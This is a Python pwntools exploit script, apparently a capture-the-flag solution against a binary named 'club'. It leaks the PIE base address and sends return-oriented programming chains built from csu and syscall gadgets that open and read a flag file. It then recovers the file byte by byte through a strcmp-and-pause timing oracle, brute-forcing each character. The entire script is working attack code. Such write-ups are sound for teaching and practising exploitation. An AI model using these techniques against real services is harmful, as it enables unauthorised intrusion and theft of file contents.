#!/usr/bin/python
from pwn import *
from base64 import b64decode

context.arch = 'amd64'
elf = ELF('club')

def pwn(try_c, flag_len):
    # io = process('./club')
    io = remote('127.0.0.1', 9999)
    io.sendafter('Hey, this is XS-Club, your name?\n', 'a')
    io.recvuntil('Okay, ')
    pie_base = u64(io.recv(6).ljust(8, '\x00')) - (0x561d75601161 - 0x561d75600000)
    strcmp_plt = pie_base + elf.plt['strcmp']
    read_plt = pie_base + elf.plt['read']
    read_got = pie_base + elf.got['read']
    pop_rdi = pie_base + 0x00000000000011a3
    pop_rsi_r15 = pie_base + 0x00000000000011a1
    syscall = pie_base + 0x00000000000009f5
    set_rdx_10 = pie_base + 0x00000000000009f7
    csu1 = pie_base + 0x000000000000119A
    csu2 = pie_base + 0x0000000000001180
    bss_start = pie_base + 0x0000000000202020
    flag_str_addr = pie_base + 0x000000000020207a
    try_chr_addr = pie_base + 0x000000000020207f
    target_chr_addr = bss_start + 0x300
    set_rax_2 = flat([  #open
        pop_rdi,
        pie_base + 0x00000000000011E7,
        pop_rsi_r15,
        pie_base + 0x00000000000015A0,
        0,
        strcmp_plt
    ])
    set_rax_0x22 = flat([   #pause
        pop_rdi,
        pie_base + 0x00000000000011EF,
        pop_rsi_r15,
        pie_base + 0x00000000000015A0,
        0,
        strcmp_plt
    ])
    test_gadget = pie_base + 0x000000000000099B

    io.sendafter('invitation code\n', flat([b64decode('ZjFhZ3tYU0NURi0yMDIyLWdvLWdvLWdvfQ=='), '\x00flag\x00', try_c]))
    rop_chain = flat([
        set_rax_2,
        pop_rdi,
        flag_str_addr,
        pop_rsi_r15,
        0,
        0,
        syscall,
        csu1,
        0,
        1,
        read_got, 
        0,  #edi
        target_chr_addr,    #rsi
        flag_len + 1,   #rdx
        csu2,
        'a' * 56,
        pop_rdi,
        try_chr_addr,
        pop_rsi_r15,
        target_chr_addr + flag_len,
        0,
        strcmp_plt,
        test_gadget,
        set_rax_0x22,
        syscall
    ])
    if flag_len == 9:
        rop_chain = flat([
            set_rax_2,    
            pop_rdi,      
            flag_str_addr,
            pop_rsi_r15,  
            0,            
            0,            
            syscall,      
            pop_rdi,
            0,
            pop_rsi_r15,
            target_chr_addr,
            0,
            set_rdx_10,
            read_plt,
            pop_rdi,                   
            try_chr_addr,              
            pop_rsi_r15,               
            target_chr_addr + flag_len,
            0,                         
            strcmp_plt,                
            test_gadget,               
            set_rax_0x22,              
            syscall                    
        ])
    io.sendlineafter('Good, just leave your phone number here\n', flat({0x28: rop_chain}))
    sleep(0.1)
    io.recvuntil('Well done~\nNow you can join the club, go crazy!!! *\\(^o^)/*\n')

    try:
        io.recv(timeout = 0.25)
        io.close()
        return True
    except:
        io.close()
        return False

table = 'abcdefghijklnmopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890{}-_@$&*!?.'
flag = ''
t = time.time()
while True:
    for c in table:
        if pwn(c, len(flag)):
            flag += c
            break
    if flag.endswith('}'):
        success(flag)
        success(flat(['time: ', str(round(time.time() - t, 2)), 's']))
        break
    else:
        info(flag)
        info(flat(['time: ', str(round(time.time() - t, 2)), 's']))
    sleep(0.25)

